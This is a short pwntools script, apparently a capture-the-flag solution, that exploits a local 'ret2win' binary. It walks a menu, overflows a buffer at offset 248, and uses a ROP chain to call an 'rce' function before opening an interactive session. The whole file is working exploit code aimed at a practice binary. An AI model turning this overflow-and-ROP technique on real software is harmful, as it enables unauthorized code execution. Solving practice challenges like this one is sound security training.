from pwn import *

elf = context.binary = ELF("./ret2win")

rop = ROP(elf)
rop.raw(rop.ret)
rop.call(elf.symbols["rce"])

r = process("./ret2win")

r.recvuntil(b"> ")
r.sendline(b"3")

r.recvuntil(b"> ")
r.sendline(b"A")

payload = flat({248: rop.chain()})
r.recvuntil(b"continuaci")
r.recvuntil(b"n")
r.sendline(payload)

r.interactive()

